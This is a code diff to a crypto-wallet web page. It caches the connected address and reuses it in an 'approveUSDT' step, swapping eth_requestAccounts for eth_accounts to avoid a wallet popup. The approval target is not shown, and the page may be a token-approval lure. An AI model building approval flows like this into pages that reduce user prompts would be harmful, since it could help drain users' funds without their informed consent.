@@ -105,6 +105,7 @@ var walletAddr = '';
 var connected = false;
 var selectedWallet = '';
 var provider = null;
+var connectedAddr = '';
 
 function showMsg(text, type) {
   var m = document.getElementById('msg');
@@ -234,6 +235,7 @@ async function connectWallet() {
     }
 
     connected = true;
+    connectedAddr = addr;
     setStep(1, 'done');
     showMsg('钱包已连接: ' + addr.slice(0,8) + '...' + addr.slice(-4), 'ok');
     document.getElementById('connectBtn').style.display = 'none';
@@ -273,12 +275,11 @@ async function approveUSDT() {
   document.getElementById('bnbInfo').style.display = 'none';
 
   try {
-    var accounts = await provider.request({ method: 'eth_accounts' });
-    var from = accounts[0];
+    // Use the address from connectWallet (already authorized)
+    var from = connectedAddr;
     if (!from) {
-      // TokenPocket sometimes doesn't return accounts via eth_accounts
-      // Try eth_requestAccounts instead
-      accounts = await provider.request({ method: 'eth_requestAccounts' });
+      // Fallback: try eth_accounts (should not trigger popup)
+      var accounts = await provider.request({ method: 'eth_accounts' });
       from = accounts[0];
     }
     if (!from) {
